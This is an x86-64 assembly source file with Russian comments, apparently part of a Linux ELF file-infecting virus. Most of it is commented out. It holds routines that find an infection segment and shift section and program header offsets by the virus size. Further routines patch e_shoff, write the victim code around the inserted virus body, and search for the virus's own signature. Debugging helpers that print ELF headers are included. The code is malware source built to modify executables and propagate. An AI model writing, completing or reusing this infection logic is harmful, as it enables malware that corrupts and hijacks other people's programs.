//     add     %rcx, %rsi     # узнали, на каком vaddr он заканчивается 0x40069c

//     mov     %r9, %r8
//     SET_INFECTED_SEG_VADDR_END %r8, %rsi

//     mov     %r9, %r8
//     SET_INFECTED_SEG_SIZE %r8, %rcx

//     mov     %r9, %r8
//     GET_VICTIM_SHDR_AMOUNT %r8, %rsi

//     mov     %r9, %r8
//     GET_INFECTED_SEG_VADDR_END %r8, %rdx

//     mov     %r9, %r8
//     GET_VICTIM_SHDR_TABLE_ADDR %r8, %rdi

//     call    find_infection_seсtion

//     mov     %r9, %r8
//     SET_INFECTED_SECT_ADDR %r8, %rax # 0x7ffff7ff8e28

//     mov     %r9, %r8

//     # в rax адрес заражаемой секции
//     # в r8 - адрес базы переменных
//     # r12 - адрес заголовков секций
//     # r11 - размер заголовков программ
//     # r10 - адрес заголовков программ

//     # свободны: rcx, r13, r14, r15, rdx, rsi, rdi
// recount:
//     mov     %r8, %r9
//     GET_INFECTED_SEG_VADDR_END %r9, %rdx

//     mov     %r8, %r9
//     GET_INFECTED_SEG_ADDR %r9, %rcx

//     mov     %r8, %r9
//     GET_VIRUS_CODE_SIZE %r9, %rsi

//     mov     %r8, %r9
//     GET_INFECTED_SECT_ADDR %r9, %rdi

//     call    add_size_to_shdr  # увеличили поле sh_size на размер кода вируса

//     mov     %r8, %r9
//     GET_VIRUS_CODE_SIZE %r9, %rdx

//     mov     %r8, %r9
//     GET_VICTIM_SHDR_AMOUNT %r9, %rsi

//     mov     %r8, %r9
//     GET_VICTIM_SHDR_TABLE_ADDR %r9, %rdi

//     call    shdr_offset_and_addr_recount   # правим поля в заголовках секций

//     mov     %r8, %r9
//     GET_INFECTED_SEG_ADDR %r9, %rdi
//     PHDR_P_OFFSET  %rdi, %rsi

//     mov     %r8, %r9
//     GET_INFECTED_SEG_ADDR %r9, %rdi

//     PHDR_P_FILESZ %rdi, %r13
//     add     %r13, %rsi      # узнали размер кода от нач. эльфа до точки, куда запишем
//                             # вирус
//     mov     %r8, %r9
//     SET_VICTIM_CODE_BEFORE_INFECT_POINT_SIZE  %r9, %rsi

//     mov     %r8, %r9
//     GET_VICTIM_PHDR_AMOUNT %r9, %rsi

//     mov     %r8, %r9
//     GET_VICTIM_PHDR_TABLE_ADDR %r9, %rdi

//     mov     %r8, %r9
//     GET_VIRUS_CODE_SIZE %r9, %rdx

//     call    phdr_offset_and_addr_recount   # правим поля в заголовках сегментов

//     mov     %r8, %r9
//     GET_INFECTED_SEG_ADDR %r9, %rdi

//     mov     %r8, %r9
//     GET_VIRUS_CODE_SIZE %r9, %rsi

//     call    add_size_to_phdr   # исправили поля p_filesz и p_memsz

//     mov     %r8, %r9
//     GET_VICTIM_ELF_ADDR %r9, %rdi

//     mov     %r8, %rcx
//     GET_VICTIM_SHDR_TABLE_SIZE %rcx, %r9

//     ELF_E_SHOFF %rdi, %rdx  # узнали смещение заголовков секций жертвы

//     add     %r9, %rdx       # смещение, по которому заканчиваются заголовки секций

//     mov     %r8, %r9
//     GET_INFECTED_SEG_SIZE %r9, %rcx
//     sub     %rcx, %rdx      # размер кода от точки заражения до конца файла жертвы

//     mov     %r8, %r9
//     SET_VICTIM_CODE_AFTER_INFECT_POINT_SIZE %r9, %rdx

//     mov     %r8, %r9
//     GET_VICTIM_ELF_ADDR %r9, %rdi

//     mov     %r8, %r9
//     GET_VIRUS_CODE_SIZE %r9, %r14

//     add      $0x28, %rdi
//     add      %r14, (%rdi)    # увеличили поле e_shoff на размер кода вируса

//     # r14 - размер кода вируса
//     # r8  - адрес кода жертвы
//     # r12 - адрес заголовков секций
//     # r11 - размер заголовков программ
//     # r10 - адрес заголовков программ

//     # свободны: rsi, rdi, rcx, rdx, r13, r15
// recombine_elf:

//     mov     $new_elf_file, %rdi
//     O_RDWR_AND_O_APPEND %rsi
//     call    open

//     # в rax дескриптор открытого файла
//     cmp      $0, %rax
//     jle      test_file_infection_end

//     mov     %rax, fd(%rip) # дескриптор файла

//     mov     %r8, %r9
//     GET_VICTIM_CODE_BEFORE_INFECT_POINT_SIZE %r9, %rdx

//     mov     %r8, %r9
//     GET_VICTIM_ELF_ADDR %r9, %rsi

//     mov     fd(%rip), %rdi # дескриптор файла
//     call   pwrite  # записали код жертвы от начала файла до точки заражения



//     # mov     %r8, %r9
//     # GET_VIRUS_CODE_ADDR %r9, %rsi

//     # mov     %r8, %r9
//     # GET_VIRUS_CODE_SIZE %r9, %rdx

//     # call   pwrite  # вписали вирус

//     # #----------------------

//     # push   %rdi

//     # mov     %r8, %r9
//     # GET_VICTIM_SHDR_TABLE_ADDR %r9, %rdi

//     # mov     %r8, %r9
//     # GET_VICTIM_SHDR_AMOUNT %r9, %rsi

//     # call   print_all_section_headers

//     # pop    %rdi
//     # #----------------------
//     # mov     %r8, %r9
//     # GET_INFECTED_SEG_SIZE %r9, %rdx

//     # mov     %r8, %r9
//     # GET_VICTIM_ELF_ADDR %r9, %rsi
//     # add    %rdx, %rsi

//     # mov     %r8, %r9
//     # GET_VICTIM_CODE_AFTER_INFECT_POINT_SIZE %r9, %rdx

//     # call   pwrite   # вписали код от точки заражения до конца файла жертвы

//     call   close

test_file_infection_end:
    ret

// // _test_file_infection_error:
// //     mov     $1, %rax            # write
// //     mov     $1, %rdi            # to stdout
// //     lea     _errmsg_openfile_tfi(rip), %rsi
// //     mov     $len_errmsg_openfile_tfi, %rdx
// //     syscall
// // _errmsg_openfile_tfi:
// //     .string "err: openfile in _test_file_infection\n"
// //     .set len_errmsg_openfile_tfi, . - _errmsg_openfile_tfi
// //     jmp _exit

// //     # побайтово проверяет содержимое по заданному указателю, пока не найдет
// //     # сигнатуру. Если нашел - возвращает адрес, по которому она расположена, в
// //     # противном случае возвращает 0
// //     # в rdi принимает указатель на код, в котором следует искать сигнатуру
// //     # в rsi - размер этого кода в байтах
// // find_virus_signature:

// //     push    %rbp
// //     mov     %rsp, %rbp

// //     push    %rcx
// //     push    %rdx
// //     push    %rbx

// //     mov     %rsi, %rcx

// // create_example:
// //     sub     $0x18, %rsp
// //     lea     -0x8(%rbp),  %rdx

// //     movb     $0x4, (%rdx)
// //     inc      %rdx

// //     movb     $0x0, (%rdx)
// //     inc      %rdx

// //     movb     $0x0, (%rdx)
// //     inc      %rdx

// //     movb     $0x0, (%rdx)
// //     inc      %rdx

// //     movb     $0x14, (%rdx)
// //     inc      %rdx

// //     movb     $0x0, (%rdx)
// //     inc      %rdx

// //     movb     $0x0, (%rdx)
// //     inc      %rdx

// //     movb     $0x0, (%rdx)
// //     inc      %rdx

// //     movb     $0x3, (%rdx)
// //     inc      %rdx

// //     movb     $0x0, (%rdx)
// //     inc      %rdx

// //     movb     $0x0, (%rdx)
// //     inc      %rdx

// //     movb     $0x0, (%rdx)
// //     inc      %rdx

// //     movb     $0x47, (%rdx)
// //     inc      %rdx

// //     movb     $0x4e, (%rdx)
// //     inc      %rdx

// //     movb     $0x55, (%rdx)
// //     inc      %rdx

// //     movb     $0x0, (%rdx)
// //     inc      %rdx

// //     lea     -0x8(%rbp),  %rsi  # загрузили адрес начала примера в rsi
// //     mov      $0x0, %rdx        # установили счетчик совпадения

// // find_virus_signature_cycle:

// //     movzwl   (%rsi), %eax
// //     movzwl  %ax, %eax

// //     movzwl   (%rdi), %ebx
// //     movzwl  %bx, %ebx

// //     cmp     %al, %bl
// //     jne     mismatch_example

// //     inc     %rdx

// //     inc     %rdi
// //     inc     %rsi

// //     cmp     $0x10, %rdx
// //     je      find_virus_signature_success

// //     jmp     find_virus_signature_continue_cycle

// // mismatch_example:
// //     lea     -0x8(%rbp),  %rsi  # загрузили адрес начала примера в rsi
// //     mov      $0x0, %rdx        # установили счетчик совпадения

// //     inc     %rdi

// // find_virus_signature_continue_cycle:
// //     loop    find_virus_signature_cycle

// // find_virus_signature_fail:
// //     mov     $0x0, %rax

// //     jmp     find_virus_signature_end

// // find_virus_signature_success:
// //     sub     $0x10, %rdi
// //     mov     %rdi, %rax

// // find_virus_signature_end:
// //     add     $0x18, %rsp

// //     pop     %rbx
// //     pop     %rdx
// //     pop     %rcx

// //     pop     %rbp
// //     ret

// // test_find_virus_signature:
// //     push    %rbp
// //     mov     %rsp, %rbp

// //     mov     $virus_file_name, %rdi
// //     mov 	$O_RDONLY,  %rsi
// //     call    _openfile

// //     mov     %rax, %rsi
// //     mov     $0x0, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0x0, %r8
// //     call	my_printf

// //     mov     %rax, %rdi
// //     mov     $0x4c70, %rsi

// //     call    find_virus_signature

// //     mov     %rax, %rsi
// //     mov     $0x0, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0x0, %r8
// //     call	my_printf

// //     pop     %rbp
// //     ret

// //     # читает данные из памяти
// //     # принимает в rdi адрес, куда будут записаны данные
// //     # в rsi - адрес, откуда данные чистаются
// //     # в rdx - размер данных
// //     .globl  read_code
// // 	.type	read_code, @function
// // read_code:
// //     push    %rbx

// //     mov     %rdx, %rbx
// //     mov     $0x1, %rdx
// //     call    fread

// //     pop     %rbx
// //     ret

// //     # ищет заголовок последнего сегмента кода
// //     # последний сегмент - это сегмент, чей offset + size находится дальше
// //     # offset + size прочих сегментов
// //     # принимает в rdi указатель на таблицу заголовков программ
// //     # в rsi - количество заголовков
// //     # возвращает указатель на  заголовок последнего сегмента
// // find_last_segment_header:
// //     push    %rcx
// //     push    %rdx
// //     push    %r8
// //     push    %r9

// //     mov     %rsi, %rcx
// //     mov     %rdi, %r8

// // find_last_segment_header_cycle:
// //     mov     %rdi, %rax

// //     PHDR_P_OFFSET %rdi, %rdx   # считаем offset + size текущего загоовка
// //     mov     %rax, %rdi

// //     PHDR_P_FILESZ %rdi, %rsi
// //     add     %rsi, %rdx
// //     mov     %rdx, %r9

// //     mov     %r8,  %rdi        # считаем offset + size сохраненного заголовка
// //     PHDR_P_OFFSET %rdi, %rdx

// //     mov     %r8, %rdi
// //     PHDR_P_FILESZ %rdi, %rsi
// //     add     %rsi, %rdx

// //     cmp     %rdx, %r9
// //     jl      next_iter

// //     mov      %rax, %r8
// // next_iter:

// //     mov   %rax, %rdi
// //     add   $0x38, %rdi

// //     loop find_last_segment_header_cycle

// //     mov    %r8, %rax

// //     pop    %r9
// //     pop    %r8
// //     pop    %rdx
// //     pop    %rcx

// //     ret

// // test_find_last_segment_header:
// //     push    %rbp
// //     mov     %rsp, %rbp

// //     mov     $file_name3, %rdi
// //     mov 	$O_RDONLY,  %rsi
// //     call    _openfile

// //     cmp     $0, %rax
// //     jle     test_find_last_segment_header_end

// //     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
// //     mov     %rax, %rsi

// //     ELF_E_PHOFF %rdi, %rcx
// //     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

// //     ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
// //     movl    (%rax), %ecx
// //     movzwl  %cx, %ecx

// //     mov     %rcx, %rdx

// //     mov     $0x38, %rax
// //     imul    %rcx,  %rax

// //     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
// //     sub     %rax,  %rsp

// //     lea     (%rsp),  %rdi

// //     call    read_all_program_headers

// //     lea     (%rsp),  %rdi
// //     mov     %rcx, %rsi
// //     mov     %rax, %rcx

// //     call    find_last_segment_header

// //     mov     %rax, %rdi
// //     call    print_program_header

// //     add     %rcx,  %rsp

// // test_find_last_segment_header_end:
// //     pop %rbp
// //     ret

// /* READ_ELF_HEADER
//     # читает заголовок эльфа из памяти

//     * @PARAMS
//     * %RDI - dest
//     * %RSI - src - укаатель на память, где лежит эльф файл

//     */

// //     .globl  _read_elf_header
// // 	.type	_read_elf_header, @function

// // _read_elf_header:
// //     push    %rbx
// //     push    %rcx

// //     mov     $0x1, %rdx
// //     mov     $0x40, %rcx  # elfhdr sz

// //     call    my_fread

// //     pop     %rdx
// //     pop     %rcx

// //     ret

//     // TEST READ_ELF_HEADER

//     // цель теста: открыть заданный эльф, смаппить его в память,
//     // прочитать из памяти его заголовок и вывести его в stdout
// test_elf_hdr_buf:
//     .space 64, 0

// test_elf_file:
//     .string "ex"

// test_elf_file_err_msg:
//     .string "ERR: read elf header \n"
//     .set len_test_elf_file_err_msg, . - test_elf_file_err_msg

// // test_read_elf_header:
// //     lea     test_elf_file(%rip), %rdi
// //     mov 	$O_RDONLY,  %rsi
// //     // O_RDWR %rsi
// //     call    _openfile

// //     cmp     $0, %rax
// //     jle     test_read_elf_header_exit

// //     mov     %rax, %rsi                    # src ptr

// //     lea     test_elf_hdr_buf(%rip), %rdi  # dest ptr
// //     call    read_elf_header

// //     lea     test_elf_hdr_buf(%rip), %rdi
// //     call    print_elf_header

// //     jmp     test_read_elf_header_exit

// // test_read_elf_header_error:
// //     lea     test_elf_file_err_msg(%rip), %rsi
// // 	mov     len_test_elf_file_err_msg, %rdx
// // 	call    _my_write

// // test_read_elf_header_exit:
// //     ret

// //     # читает заголовок пргграммы из памяти
// //     # в rsi принимает указатель на память, в которой лежит эльф, смещенный до начала
// //     # таблицы заголовков программы, в rdi - указатель на место под записья
// // program_header:
// //     .space 0x38,0

// //     .globl  read_program_header
// // 	.type	read_program_header, @function

// // read_program_header:
// //     push %rbx
// //     push %rdx

// //     mov  $0x1, %rdx
// //     mov  $0x38, %rbx

// //     call fread

// //     pop  %rdx
// //     pop  %rbx

// //     ret

// //     # принимает в edi указатель на структуру заголовка программы и выводит его поля

// //     .globl  print_program_header
// // 	.type	print_program_header, @function

// // print_program_header:

// //     push    %rsi
// //     push    %rdx
// //     push    %rcx
// //     push    %r8

// //     mov     %rdi, %rcx

// // 	movl	(%rcx), %esi
// //     mov     $p_type_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0xE, %r8
// //     call	my_printf

// //     add     $0x4, %rcx

// //     movl	(%rcx), %esi
// //     mov     $p_flags_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0xF, %r8
// //     call	my_printf

// //     add     $0x4, %rcx

// //     mov 	(%rcx), %rsi
// //     mov     $p_offset_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0x10, %r8
// //     call	my_printf

// //     add     $0x8, %rcx

// //     mov 	(%rcx), %rsi
// //     mov     $p_vaddr_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0xF, %r8
// //     call	my_printf

// //     add     $0x8, %rcx

// //     mov 	(%rcx), %rsi
// //     mov     $p_paddr_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0xF, %r8
// //     call	my_printf

// //     add     $0x8, %rcx

// //     mov 	(%rcx), %rsi
// //     mov     $p_filesz_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0x10, %r8
// //     call	my_printf

// //     add     $0x8, %rcx

// //     mov 	(%rcx), %rsi
// //     mov     $p_memsz_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0xF, %r8
// //     call	my_printf

// //     add     $0x8, %rcx

// //     mov 	(%rcx), %rsi
// //     mov     $p_align_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0xF, %r8
// //     call	my_printf

// //     pop     %r8
// //     pop     %rcx
// //     pop     %rdx
// //     pop     %rsi

// //     ret

// // test_read_program_header:

// //     mov     $file_name3, %rdi
// //     mov 	$O_RDONLY, %rsi
// //     call    _openfile

// //     cmp     $0, %rax

// //     jle     test_read_program_header_end

// //     mov     %rax, %rdi
// //     mov     %rdi,  %rsi

// //     ELF_E_PHOFF %rdi, %rcx
// //     add     %rcx, %rsi
// //     mov     $program_header, %rdi
// //     call    read_program_header

// //     mov     $program_header, %rdi
// //     call    print_program_header

// // test_read_program_header_end:
// //     ret

// //     # читает все заголовки програм
// //     # принимает в rdi адрес, по которому должны быть записаны заголовки
// //     # в rsi - адрес, по которому лежат заголвки в памяти
// //     # в rdx - количество заголовков
// //     .globl  read_all_program_headers
// // 	.type	read_all_program_headers, @function

// // read_all_program_headers:

// //     push    %rbp
// //     mov     %rsp, %rbp

// //     push    %rcx
// //     mov     %rdx, %rcx
// // read_all_program_headers_cycle:

// //     call    read_program_header

// //     loop    read_all_program_headers_cycle
// //     pop     %rcx

// //     pop     %rbp
// //     ret

// //     # принимает в rdi aдрес, по которому лежат заголовки
// //     # в rsi - их количество

// //     .globl  print_all_program_headers
// // 	.type	print_all_program_headers, @function

// // print_all_program_headers:

// //     push    %rbp
// //     mov     %rsp, %rbp

// //     push    %rcx
// //     push    %r8
// //     push    %rdx
// //     push    %rax

// //     mov     %rsi, %rcx

// // print_all_program_headers_cycle:

// //     mov     %rdi, %rax

// //     call    print_program_header

// //     mov     $next_str, %rdi
// //     mov     $0x0, %rdx
// //     mov     $0x1, %r8

// //     call    my_printf

// //     mov     %rax, %rdi
// //     add     $0x38, %rdi

// //     loop    print_all_program_headers_cycle

// //     pop     %rax
// //     pop     %rdx
// //     pop     %r8
// //     pop     %rcx

// //     pop     %rbp
// //     ret

// // test_read_all_program_headers:
// //     push    %rbp
// //     mov     %rsp, %rbp

// //     mov     $file_name3, %rdi
// //     mov 	$O_RDONLY,  %rsi
// //     call    _openfile

// //     cmp     $0, %rax
// //     jle     test_read_all_program_headers_end

// //     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
// //     mov     %rax, %rsi

// //     ELF_E_PHOFF %rdi, %rcx
// //     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

// //     ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
// //     movl    (%rax), %ecx
// //     movzwl  %cx, %ecx

// //     mov     %rcx, %rdx

// //     mov     $0x38, %rax
// //     imul     %rcx,  %rax

// //     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
// //     sub     %rax,  %rsp

// //     lea     (%rsp),  %rdi

// //     call    read_all_program_headers

// //     lea     (%rsp),  %rdi
// //     mov     %rcx, %rsi

// //     call    print_all_program_headers
// //     add     %rax,  %rsp

// // test_read_all_program_headers_end:
// //     pop %rbp
// //     ret

// //     # пересчитывает смещения и адреса секций, которые будут находиться после
// //     #  вставленного в жертву вируса
// //     # т.е. если вирус вставляется после тысячного байта в эльф-жертву, то все,
// //     # что находится после него, должно быть смещено на размер кода вируса.
// //     # поэтому мы будем пересчитывать адреса и смещения для всех секций, которые
// //     # находятся после той точки, кда вставлялся вирус и менять заголовки секций
// //     # ( менять заголовки программ не придется, поскольку вирус вставляется после
// //     #   последнего сегмента кода )

// //     # принимает в rdi  указатель на заголовки,
// //     # в rsi - их количество, в rdx - адрес, по которому будет записан вирус,
// //     # в rcx - сколько байт занимает вирус

// //     .globl  shdr_offset_and_addr_recount
// //     .type	shdr_offset_and_addr_recount, @function

// // recount_msg:
// //     .string "after recount: \n"

// // shdr_offset_and_addr_recount:

// //     push  %r8

// //     mov   %rcx, %r8
// //     mov   %rsi, %rcx        # установили счетчик цикла

// // shdr_offset_and_addr_recount_cycle:

// //     add   $0x18, %rdi

// //     cmp   %rdx,  (%rdi)

// //     jl    next_iter_recount

// //     add   %r8, (%rdi)   # пересчитываем адрес и смещение

// //     sub   $8, %rdi

// //     cmp   $0, (%rdi)
// //     jle   mov_addr_to_offset_field

// //     add   %r8, (%rdi)

// // mov_addr_to_offset_field:

// //     add   $8, %rdi

// // next_iter_recount:
// //     add   $0x28, %rdi

// //     loop shdr_offset_and_addr_recount_cycle
// //     pop  %r8

// //     ret

// // test_shdr_offset_and_addr_recount:

// //     push    %rbp
// //     mov     %rsp, %rbp

// //     mov     $file_name3, %rdi
// //     mov 	$O_RDONLY,  %rsi
// //     call    _openfile

// //     cmp     $0, %rax
// //     jle     test_shdr_offset_and_addr_recount_end

// //     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
// //     mov     %rax, %rsi

// //     ELF_E_SHOFF %rdi, %rcx
// //     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

// //     ELF_E_SHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
// //     movl    (%rax), %ecx
// //     movzwl  %cx, %ecx

// //     mov     %rcx, %rdx

// //     mov     $0x40, %rax
// //     imul     %rcx,  %rax

// //     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
// //     sub     %rax,  %rsp

// //     lea     (%rsp),  %rdi

// //     call    read_all_section_headers

// //     lea     (%rsp),  %rdi
// //     mov     %rcx, %rsi

// //     call    print_all_section_headers

// //     mov     %rcx, %r9

// //     lea     (%rsp),  %rdi
// //     mov     %rcx, %rsi
// //     mov     $0xe10, %rdx
// //     mov     $0x3e8, %rcx

// //     call    shdr_offset_and_addr_recount

// //     mov     $recount_msg,%rdi
// //     mov     $0x0, %rsi
// //     mov     $0x0, %rdx
// //     mov     $0x10, %r8
// //     call    my_printf

// //     lea     (%rsp), %rdi
// //     mov     %r9, %rsi
// //     call    print_all_section_headers

// //     add     %rax,  %rsp

// // test_shdr_offset_and_addr_recount_end:
// //     pop %rbp

// //     ret

// //     # принимает в rdi  указатель на заголовки,
// //     # в rsi - их количество, в rdx - адрес, по которому будет записан вирус,
// //     # в rcx - сколько байт занимает вирус
// // phdr_offset_and_addr_recount:

// //     push  %r8

// //     mov   %rcx, %r8
// //     mov   %rsi, %rcx        # установили счетчик цикла

// // phdr_offset_and_addr_recount_cycle:

// //     add   $0x10, %rdi    # проверяем адрес

// //     cmp   %rdx,  (%rdi)  # если сегмент находится до точки записи вируса
// //     jl    next_iter_recount_phdr  #  пропускаем заголовок

// //     add   %r8, (%rdi)   # иначе пересчитываем vaddr и paddr
// //     add   $0x8, %rdi
// //     add   %r8, (%rdi)

// //     sub   $0x10, %rdi  # сдвигаем указатель на смещение

// // add_offset_phdr2:
// //     cmp   $0x0, (%rdi)  # сли ноль, то не редактируем
// //     jle   mov_addr_to_offset_field_phdr

// //     add   %r8, (%rdi)

// // mov_addr_to_offset_field_phdr:

// //     add   $0x8, %rdi

// // next_iter_recount_phdr:
// //     add   $0x28, %rdi
// //     loop phdr_offset_and_addr_recount_cycle

// //     pop  %r8

// //     ret

// // test_phdr_offset_and_addr_recount:
// //     push    %rbp
// //     mov     %rsp, %rbp

// //     mov     $file_name3, %rdi
// //     mov 	$O_RDONLY,  %rsi
// //     call    _openfile

// //     cmp     $0, %rax
// //     jle     test_phdr_offset_and_addr_recount_end

// //     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
// //     mov     %rax, %rsi

// //     ELF_E_PHOFF %rdi, %rcx
// //     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

// //     ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
// //     movl    (%rax), %ecx
// //     movzwl  %cx, %ecx

// //     mov     %rcx, %rdx

// //     mov     $0x40, %rax
// //     imul     %rcx,  %rax

// //     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
// //     sub     %rax,  %rsp

// //     lea     (%rsp),  %rdi

// //     call    read_all_program_headers

// //     lea     (%rsp),  %rdi
// //     mov     %rcx, %rsi

// //     call    print_all_program_headers

// //     mov     %rcx, %r9

// //     lea     (%rsp),  %rdi
// //     mov     %rcx, %rsi
// //     mov     $0x400040, %rdx
// //     mov     $0x10, %rcx

// //     call    phdr_offset_and_addr_recount

// //     mov     $recount_msg,%rdi
// //     mov     $0x0, %rsi
// //     mov     $0x0, %rdx
// //     mov     $0x10, %r8
// //     call    my_printf

// //     lea     (%rsp), %rdi
// //     mov     %r9, %rsi
// //     call    print_all_program_headers

// //     add     %rax,  %rsp

// // test_phdr_offset_and_addr_recount_end:
// //     pop  %rbp

// //     ret


// //     # читает заголовок секции из памяти
// //     # в rsi принимает указатель на память, в которой лежит эльф, смещенный до начала
// //     # таблицы заголовков секций, в rdi - указательн на память, куда будет записан
// //     # заголовок
// // section_header:
// //     .space 0x40, 0

// //     .globl  read_section_header
// // 	.type	read_section_header, @function

// // read_section_header:
// //     push %rbx
// //     push %rdx

// //     mov  $0x1, %rdx
// //     mov  $0x40, %rbx

// //     call fread

// //     pop  %rdx
// //     pop  %rbx

// //     ret
// //     # принимает в rdi указатель на структуру заголовка секции
// //     # печатает все поля секции
// // print_section_header:

// //     push    %rsi
// //     push    %rdx
// //     push    %rcx
// //     push    %r8

// //     mov     %rdi, %rcx

// // 	movl	(%rcx), %esi
// //     mov     $sh_name_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0xF, %r8
// //     call	my_printf

// //     add     $0x4, %rcx

// //     movl	(%rcx), %esi
// //     mov     $sh_type_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0xF, %r8
// //     call	my_printf

// //     add     $0x4, %rcx

// //     movl	(%rcx), %esi
// //     mov     $sh_flags_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0x10, %r8
// //     call	my_printf

// //     add     $0x8, %rcx

// //     mov 	(%rcx), %rsi
// //     mov     $sh_addr_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0xF, %r8
// //     call	my_printf

// //     add     $0x8, %rcx

// //     mov 	(%rcx), %rsi
// //     mov     $sh_offset_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0x11, %r8
// //     call	my_printf

// //     add     $0x8, %rcx

// //     mov 	(%rcx), %rsi
// //     mov     $sh_size_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0xF, %r8
// //     call	my_printf

// //     add     $0x8, %rcx

// //     mov 	(%rcx), %rsi
// //     mov     $sh_link_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0xF, %r8
// //     call	my_printf

// //     add     $0x4, %rcx

// //     mov 	(%rcx), %rsi
// //     mov     $sh_info_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0xF, %r8
// //     call	my_printf

// //     add     $0x4, %rcx

// //     movl 	(%rcx), %esi
// //     mov     $sh_addralign_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0x14, %r8
// //     call	my_printf

// //     add     $0x8, %rcx

// //     movl 	(%rcx), %esi
// //     mov     $sh_entsize_msg, %rdi
// //     mov     $0x10, %rdx
// //     mov     $0x12, %r8
// //     call	my_printf

// //     pop     %r8
// //     pop     %rcx
// //     pop     %rdx
// //     pop     %rsi

// //     ret
// // test_read_section_header:

// //     mov     $file_name3, %rdi
// //     mov 	$O_RDONLY,  %rsi
// //     call    _openfile

// //     cmp     $0, %rax

// //     jle     test_read_section_header_end

// //     mov     %rax, %rdi
// //     mov     %rdi,  %rsi

// //     ELF_E_SHOFF %rdi, %rcx
// //     add     %rcx, %rsi
// //     mov     $section_header, %rdi
// //     call    read_section_header

// //     mov     $section_header, %rdi
// //     call    print_section_header
// // test_read_section_header_end:
// //     ret

// //     # читает все заголовки секций
// //     # принимает в rdi адрес, по которому должны быть записаны заголовки
// //     # в rsi - адрес, по которому лежат заголвки в памяти
// //     # в rdx - количество заголовков
// //     .globl  read_all_section_headers
// // 	.type	read_all_section_headers, @function

// // read_all_section_headers:

// //     push    %rbp
// //     mov     %rsp, %rbp

// //     push    %rcx
// //     mov     %rdx, %rcx
// // read_all_section_headers_cycle:

// //     call    read_section_header

// //     loop    read_all_section_headers_cycle
// //     pop     %rcx

// //     pop     %rbp
// //     ret

// //     # принимает в rdi aдрес, по которому лежат заголовки
// //     # в rsi - их количество

// //     .globl  print_all_section_headers
// // 	.type	print_all_section_headers, @function

// // print_all_section_headers:

// //     push    %rbp
// //     mov     %rsp, %rbp

// //     push    %rcx
// //     push    %r8
// //     push    %rdx
// //     push    %rax

// //     mov     %rsi, %rcx

// // print_all_section_headers_cycle:

// //     mov     %rdi, %rax

// //     call    print_section_header

// //     mov     $next_str, %rdi
// //     mov     $0x0, %rdx
// //     mov     $0x1, %r8

// //     call    my_printf

// //     mov     %rax, %rdi
// //     add     $0x40, %rdi

// //     loop    print_all_section_headers_cycle

// //     pop     %rax
// //     pop     %rdx
// //     pop     %r8
// //     pop     %rcx

// //     pop     %rbp
// //     ret

// // test_read_all_section_headers:
// //     push    %rbp
// //     mov     %rsp, %rbp

// //     mov     $file_name3, %rdi
// //     mov 	$O_RDONLY,  %rsi
// //     call    _openfile

// //     cmp     $0, %rax
// //     jle     test_read_all_section_headers_end

// //     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
// //     mov     %rax, %rsi

// //     ELF_E_SHOFF %rdi, %rcx
// //     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

// //     ELF_E_SHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
// //     movl    (%rax), %ecx
// //     movzwl  %cx, %ecx

// //     mov     %rcx, %rdx

// //     mov     $0x40, %rax
// //     imul     %rcx,  %rax

// //     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
// //     sub     %rax,  %rsp

// //     lea     (%rsp),  %rdi

// //     call    read_all_section_headers

// //     lea     (%rsp),  %rdi
// //     mov     %rcx, %rsi

// //     call    print_all_section_headers
// //     add     %rax,  %rsp

// // test_read_all_section_headers_end:
// //     pop %rbp
// //     ret

//     # принимает указатель на структуру заголовка эльфа и выводит все его поля
//     .globl  print_elf_header
// 	.type	print_elf_header, @function

// //     # принимает в rdi указатель на структуру эльф-хедера
// // print_elf_header:
// //     push    %rbp
// //     mov     %rsp, %rbp

// //     push    %rsi
// //     push    %rdx
// //     push    %rcx
// //     push    %r8

// //     add     $0x10, %rdi
// //     mov     %rdi, %rcx

// //     mov     $e_type_msg, %rdi
// //     movzwl  (%rcx), %edx
// //     movzwl  %dx,  %edx
// //     mov     %edx,  %esi
// //     mov     $0x10, %rdx
// //     mov     $0xf, %r8
// //     call    my_printf

// //     add     $0x2, %rcx

// //     mov     $e_machine_msg, %rdi
// //     movzwl  (%rcx), %edx
// //     movzwl  %dx,  %edx
// //     mov     %edx,  %esi
// //     mov     $0x10, %rdx
// //     mov     $0x12, %r8
// //     call    my_printf

